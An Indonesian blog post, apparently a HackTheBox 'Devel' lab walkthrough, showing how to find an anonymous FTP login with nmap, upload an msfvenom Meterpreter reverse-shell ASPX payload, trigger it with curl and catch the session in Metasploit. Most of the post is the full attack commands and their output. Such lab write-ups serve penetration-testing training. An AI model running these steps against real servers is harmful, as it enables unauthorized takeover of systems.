---
featured_image: "/uploads/justakazh/ftp.jpg"
author_description: Aku nulis karena aku pelupa
author_avatar: "/uploads/justakazh/1656477958868.jpeg"
author_facebook: https://facebook.com
author_twitter: https://twitter.com
author_instagram: https://instagram.com
author_donation: paypal / saweria / buymecoffe / etc
author_web: https://blog.hackstreet.id
title: FTP Anonymous Login to Meterpreter
date: 2023-01-02T00:00:00+07:00
author: Justakazh
tags:
- metasploit
- msf
- ftp
categories: ''

---
## Introduction

pada tulisan kali ini kita akan membahas tentang kerentanan pada FTP yaitu anonymous login. goals dari tulisan kali ini kita dapat mengetahui anonymous login pada FTP metode untuk mengambil alih server melalui anonymous login pada FTP.

Tulisan ini saya adaptasi dari HackTheBox tepatnya pada mesin Devel. kita bisa mengaktifkan mesin tersebut untuk melakukan demostrasi kerentanan yang kita bahas kali ini.

## Anonymous FTP

Anonymous FTP merupakan sebuah metode untuk memberi user akses ke file sehingga user tidak perlu mengidentifikasi diri mereka ke server. kita dapat memanfaatkan ini untuk mendapatkan akses pada server, akan tetapi tidak semua anonymous user dapat melakukannya ini dikarenakan konfigurasi dari server tersebut tidak mengizinkan kita untuk melakukan action seperti upload file. misalnya pada vsftp, konfigurasi  
`anon_upload_enable` pada /etc/vsftpd/vsftpd.con harus memiliki value `YES` untuk mengizinkan user melakukan upload file.


## Identification
kita dapat menggunakan nmap untuk melakukan identifikasi terhadap FTP yang mengizinkan anonymous user, sebelumnya kita harus pastikan terlebih dahulu port 21/FTP open
```bash 
┌──(punktester㉿kali)-[~]
└─$ sudo nmap -p21 -sS 10.10.10.5 
Starting Nmap 7.92 ( https://nmap.org ) at 2023-01-02 17:12 WIB
Nmap scan report for 10.10.10.5
Host is up (0.37s latency).

PORT   STATE SERVICE
21/tcp open  ftp

Nmap done: 1 IP address (1 host up) scanned in 1.17 seconds
```

setelah dipastikan bahwa port 21/FTP open, kita dapat menggunakan nmap script untuk melakukan pengecheckan secara otomatis 

- https://nmap.org/nsedoc/scripts/ftp-anon.html

``` bash 
┌──(punktester㉿kali)-[~]
└─$ sudo nmap -p21 -sS --script=ftp-anon 10.10.10.5
Starting Nmap 7.92 ( https://nmap.org ) at 2023-01-02 17:11 WIB
Nmap scan report for 10.10.10.5
Host is up (0.27s latency).

PORT   STATE SERVICE
21/tcp open  ftp
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 03-18-17  01:06AM       <DIR>          aspnet_client
| 03-17-17  04:37PM                  689 iisstart.htm
|_03-17-17  04:37PM               184946 welcome.png

Nmap done: 1 IP address (1 host up) scanned in 3.67 seconds
zsh: segmentation fault  sudo nmap -p21 -sS --script=ftp-anon 10.10.10.5
```

`ftp-anon: Anonymous FTP login allowed (FTP code 230)` ini menunjukan bahwa server tersebut mengizinkan Anonymous FTP login. selanjutnya mari kita coba untuk login pada FTP tersebut
Name: `anonymous`
Password:: `<skip / press enter>`
``` bash 
┌──(punktester㉿kali)-[~]
└─$ ftp 10.10.10.5                              
Connected to 10.10.10.5.
220 Microsoft FTP Service
Name (10.10.10.5:punktester): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password: 
230 User logged in.
Remote system type is Windows_NT.
ftp> 
```
`230 User logged in.` kita berhasil login sebagai anonymous user. dapat dilihat pada `Remote system type is Windows_NT.` server tersebut menggunakan sistem operasi windows, selanjutnya kita akan menyiapkan payload untuk melakukan reverse shell (Meterpreter).

## Meterpreter
pada kasus kali ini server tersebut memiliki port 80 yang dimana port tersebut merupakan http/web server.  kita dapat membuat sebuah payload menggunakan `msfvenom` untuk kita kirimkan dan kita jalankan pada server tersebut, kita dapat menggunakan perintah berikut ini
``` bash 
msfvenom -p windows/meterpreter/reverse_tcp lhost=10.10.14.2 lport=1337 -f aspx > exploit.aspx
```
selanjutnya kita akan membuat listener dari metasploit, kita dapat mengetikan perintah 

```bash 
msfconsole
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set lhost 10.10.14.2
set lport 1337
run
```
tahap terakhir, kita dapat mengirimpakn `exploit.aspx` yang telah kita buat pada root directory web server tersebut menggunakan FTP
```bash 
ftp> put exploit.aspx
local: exploit.aspx remote: exploit.aspx
229 Entering Extended Passive Mode (|||49164|)
125 Data connection already open; Transfer starting.
100% |************************************************************************|  2896       55.23 MiB/s    --:-- ETA
226 Transfer complete.
2896 bytes sent in 00:00 (10.32 KiB/s)
ftp> 
```
selanjutnya mari kita trigger payload tersebut dengan mengakses file exploit.aspx dari web browser / curl
```bash
curl http://10.10.10.5/exploit.aspx
```
``` bash 
msf6 > use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > 
msf6 exploit(multi/handler) > set lhost 10.10.14.2
lhost => 10.10.14.2
msf6 exploit(multi/handler) > 
msf6 exploit(multi/handler) > set lport 1337
lport => 1337
msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 10.10.14.2:1337 
[*] Sending stage (175174 bytes) to 10.10.10.5
[*] Meterpreter session 1 opened (10.10.14.2:1337 -> 10.10.10.5:49166 ) at 2023-01-02 17:32:52 +0700

meterpreter > sysinfo
Computer        : DEVEL
OS              : Windows 7 (6.1 Build 7600).
Architecture    : x86
System Language : el_GR
Domain          : HTB
Logged On Users : 2
Meterpreter     : x86/windows
meterpreter > 
```

dan kita berhasil mendapatkan akses server tersebut.